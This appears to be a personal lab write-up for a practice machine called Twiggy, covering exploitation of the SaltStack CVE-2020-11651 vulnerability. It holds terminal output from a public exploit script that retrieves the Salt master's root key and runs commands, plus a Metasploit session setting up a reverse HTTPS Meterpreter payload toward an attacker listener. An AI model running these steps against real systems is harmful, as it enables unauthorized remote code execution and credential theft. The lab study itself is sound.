# Twiggy

## Enumeration

### Autorecon

### SSH - 22
### 53

### ZeroMQ ZMTP 2.0 - 4505

### Web - 80

![](Pasted%20image%2020220112222855.png)

### Web - 8000

![](Pasted%20image%2020220112222921.png)

## Exploit
https://chr0x6eos.github.io/2021/02/20/htb-Feline.html
https://www.exploit-db.com/exploits/48421
https://ivanitlearning.wordpress.com/2021/06/02/tips-from-the-pwk-labs-and-pg-practice/
```
┌──(kali㉿kali)-[/tmp]
└─$ python3 CVE-2020-11651.py 192.168.90.62 master whoami                                                                                                           1 ⨯
Attempting to ping master at 192.168.90.62
Retrieved root key: jkKrmdnzf/PBjWAh3RXqEupvKL1c47CiQmrejLjqG0x4VTiAN86VbpasfzKIaeFQZ0SQJZS7jh4=
Got response for attempting master shell: {'jid': '20220112152927719849', 'tag': 'salt/run/20220112152927719849'}. Looks promising!
Exception ignored in: <function AsyncZeroMQReqChannel.__del__ at 0x7f2f4ed7e8b0>
Traceback (most recent call last):
  File "/home/kali/.local/lib/python3.9/site-packages/salt/transport/zeromq.py", line 185, in __del__
  File "/home/kali/.local/lib/python3.9/site-packages/salt/transport/zeromq.py", line 180, in close
  File "/home/kali/.local/lib/python3.9/site-packages/salt/transport/zeromq.py", line 1072, in close
  File "/home/kali/.local/lib/python3.9/site-packages/salt/transport/zeromq.py", line 1147, in close
  File "/home/kali/.local/lib/python3.9/site-packages/zmq/eventloop/zmqstream.py", line 405, in close
  File "/home/kali/.local/lib/python3.9/site-packages/salt/ext/tornado/ioloop.py", line 737, in remove_handler
  File "/home/kali/.local/lib/python3.9/site-packages/salt/ext/tornado/ioloop.py", line 659, in split_fd
  File "/home/kali/.local/lib/python3.9/site-packages/zmq/sugar/socket.py", line 255, in fileno
  File "/home/kali/.local/lib/python3.9/site-packages/zmq/sugar/attrsettr.py", line 48, in __getattr__
ImportError: sys.meta_path is None, Python is likely shutting down
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ python3 48421.txt.py -m 192.168.90.62 -p 4506 --exec whoami -d
[!] Please only use this script to verify you have correctly patched systems you have permission to access. Hit ^C to abort.
[+] Checking salt-master (192.168.90.62:4506) status... ONLINE
[+] Checking if vulnerable to CVE-2020-11651... YES
[*] root key obtained: jkKrmdnzf/PBjWAh3RXqEupvKL1c47CiQmrejLjqG0x4VTiAN86VbpasfzKIaeFQZ0SQJZS7jh4=
[+] Attemping to execute whoami on 192.168.90.62
[+] Successfully scheduled job: 20220112153013034641
                                                       
```


```
┌──(kali㉿kali)-[~]
└─$ msfconsole -q
[*] Starting persistent handler(s)...
msf5 > search saltstack_salt_unauth_rce

Matching Modules
================

   #  Name                                          Disclosure Date  Rank   Check  Description
   -  ----                                          ---------------  ----   -----  -----------
   0  exploit/linux/misc/saltstack_salt_unauth_rce  2020-04-30       great  Yes    SaltStack Salt Master/Minion Unauthenticated RCE


msf5 > use 0
[*] Using configured payload python/meterpreter/reverse_https
msf5 exploit(linux/misc/saltstack_salt_unauth_rce) > show options

Module options (exploit/linux/misc/saltstack_salt_unauth_rce):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   MINIONS   .*               yes       PCRE regex of minions to target
   RHOSTS                     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   ROOT_KEY                   no        Master's root key if you have it
   RPORT     4506             yes       The target port (TCP)
   SRVHOST   0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT   8080             yes       The local port to listen on.
   SSL       false            no        Negotiate SSL for incoming connections
   SSLCert                    no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                    no        The URI to use for this exploit (default is random)


Payload options (python/meterpreter/reverse_https):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The local listener hostname
   LPORT  8443             yes       The local listener port
   LURI                    no        The HTTP Path


Exploit target:

   Id  Name
   --  ----
   0   Master (Python payload)


msf5 exploit(linux/misc/saltstack_salt_unauth_rce) > set RHOSTS 192.168.123.62
RHOSTS => 192.168.123.62
msf5 exploit(linux/misc/saltstack_salt_unauth_rce) > set LHOST 192.168.49.123
LHOST => 192.168.49.123
msf5 exploit(linux/misc/saltstack_salt_unauth_rce) > run

[*] Started HTTPS reverse handler on https://192.168.49.123:8443
[*] 192.168.123.62:4506 - Using auxiliary/gather/saltstack_salt_root_key as check
[*] 192.168.123.62:4506 - Connecting to ZeroMQ service at 192.168.123.62:4506
[*] 192.168.123.62:4506 - Negotiating signature
[*] 192.168.123.62:4506 - Negotiating version
[*] 192.168.123.62:4506 - Negotiating NULL security mechanism
[*] 192.168.123.62:4506 - Sending READY command of type REQ
[*] 192.168.123.62:4506 - Yeeting _prep_auth_info() at 192.168.123.62:4506
[+] 192.168.123.62:4506 - Root key: jkKrmdnzf/PBjWAh3RXqEupvKL1c47CiQmrejLjqG0x4VTiAN86VbpasfzKIaeFQZ0SQJZS7jh4=
[*] 192.168.123.62:4506 - Connecting to ZeroMQ service at 192.168.123.62:4506
[*] 192.168.123.62:4506 - Negotiating signature
[*] 192.168.123.62:4506 - Negotiating version
[*] 192.168.123.62:4506 - Negotiating NULL security mechanism
[*] 192.168.123.62:4506 - Sending READY command of type REQ
[*] 192.168.123.62:4506 - Executing Python payload on the master: python/meterpreter/reverse_https
[*] 192.168.123.62:4506 - Yeeting runner() at 192.168.123.62:4506
[*] Exploit completed, but no session was created.
msf5 exploit(linux/misc/saltstack_salt_unauth_rce) > run

```

## Privesc


## Others
